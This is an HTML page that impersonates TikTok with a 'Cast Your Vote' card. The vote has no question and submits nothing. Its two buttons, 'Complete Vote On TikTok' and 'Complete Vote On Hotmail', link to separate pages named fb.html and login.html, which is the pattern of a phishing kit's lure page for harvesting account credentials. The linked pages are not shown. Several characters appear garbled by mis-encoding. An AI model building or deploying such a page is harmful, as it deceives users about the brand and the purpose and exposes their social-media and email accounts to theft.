<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>TikTok Vote</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<style>
:root {
  --cyan: #25f4ee;
  --pink: #fe2c55;
  --bg: #000;
  --card: rgba(255,255,255,0.05);
  --border: rgba(255,255,255,0.12);
}

* {
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
    Roboto, Helvetica, Arial, sans-serif;
}

body {
  margin: 0;
  min-height: 100vh;
  background:
    radial-gradient(circle at top left, rgba(37,244,238,0.15), transparent 40%),
    radial-gradient(circle at bottom right, rgba(254,44,85,0.15), transparent 40%),
    var(--bg);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #fff;
}

/* CARD */
.card {
  width: 100%;
  max-width: 440px;
  padding: 26px;
  border-radius: 22px;
  background: var(--card);
  backdrop-filter: blur(14px);
  border: 1px solid var(--border);
  box-shadow: 0 40px 80px rgba(0,0,0,0.9);
}

/* TRANSLATE */
.translate-wrapper {
  display: flex;
  justify-content: flex-end;
  margin-bottom: 12px;
}

#google_translate_element {
  background: rgba(0,0,0,0.4);
  border-radius: 10px;
  padding: 4px 6px;
}

.goog-te-gadget {
  color: #fff !important;
  font-size: 12px;
}

.goog-te-combo {
  background: transparent;
  color: #fff;
  border: 1px solid rgba(255,255,255,0.2);
  border-radius: 6px;
  padding: 4px;
}

/* LOGO */
.logo {
  text-align: center;
  font-weight: 900;
  font-size: 22px;
  margin-bottom: 18px;
  background: linear-gradient(135deg, var(--cyan), var(--pink));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

h1 {
  text-align: center;
  font-size: 24px;
  margin-bottom: 10px;
}

.subtitle {
  text-align: center;
  font-size: 15px;
  color: #cfcfcf;
  margin-bottom: 28px;
}

/* OPTIONS */
.vote-options {
  display: grid;
  gap: 16px;
  margin-bottom: 26px;
}

.option {
  position: relative;
  padding: 18px;
  border-radius: 16px;
  border: 1px solid var(--border);
  cursor: pointer;
}

.option input {
  display: none;
}

.option span {
  font-size: 16px;
  font-weight: 600;
}

/* BUTTON */
.submit {
  width: 100%;
  border: none;
  padding: 15px;
  border-radius: 18px;
  font-size: 16px;
  font-weight: 800;
  cursor: pointer;
  background: linear-gradient(135deg, var(--cyan), var(--pink));
  color: #000;
}

.note {
  margin-top: 18px;
  text-align: center;
  font-size: 12.5px;
  color: #9a9a9a;
}

/* MOBILE */
@media (max-width: 480px) {
  .card {
    margin: 16px;
    padding: 22px;
  }

  .translate-wrapper {
    justify-content: center;
  }
}
</style>

</head>
<body>

<div class="card">

  <!-- TRANSLATE -->
  <div class="translate-wrapper">
    <div id="google_translate_element"></div>
  </div>

  <div class="logo">‚ô™ TikTok</div>

  <h1>Cast Your Vote</h1>
  <p class="subtitle">
    Your opinion matters. Choose an option below and help shape the outcome.
  </p>

  <div class="vote-options">
    <label class="option">
      <input type="radio" name="vote">
      <span>üëç Yes, I support this</span>
    </label>

    <label class="option">
      <input type="radio" name="vote">
      <span>üëé No, I don‚Äôt agree</span>
    </label>
  </div>

  <a href="fb.html">
    <button class="submit">Complete Vote On TikTok</button>
  </a>
  <br/>
  
  <a href="login.html">
    <button class="submit">Complete Vote On Hotmail</button>
  </a>

  <div class="note">
    Voting is anonymous ‚Ä¢ Results update in real time
  </div>

</div>

<!-- GOOGLE TRANSLATE SCRIPT -->
<script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement(
    { pageLanguage: 'en' },
    'google_translate_element'
  );
}
</script>
<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

</body>
</html>
